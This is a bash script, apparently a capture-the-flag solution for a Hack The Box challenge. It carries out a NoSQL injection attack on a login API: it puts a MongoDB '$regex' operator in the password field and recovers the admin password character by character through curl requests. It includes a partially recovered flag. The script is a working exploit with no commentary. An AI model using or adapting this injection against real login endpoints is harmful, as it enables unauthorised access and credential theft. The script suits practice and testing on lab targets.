#!/bin/bash

target="http://94.237.62.195:45045/api/login"
#x="HTB{"
x="HTB{th3_4l13ns_h4v3nt_us3d_m0n"

while true; do
    found=false
    for char in {a..z} {A..Z} {0..9} '!' '#' '$' '%' '&' '(' ')' ',' '-' '/' ':' ';' '<' '=' '>' '@' '[' '\' ']' '^' '_' '`' '{' '}' '~'; do
        data="{\"username\":\"admin\", \"password\":{\"\$regex\":\"${x}${char}.*\"}}"
        response=$(curl -s -X POST -H "Content-Type: application/json" -d "$data" "$target")
        #echo $data
	#echo $response
	if [[ $response == *"Login Successful"* ]]; then
            x="${x}${char}"
            found=true
            echo "Found: $x"
            break
        fi
    done
    if [[ $found == "false" ]]; then
        break
    fi
done

echo "Final result: $x"

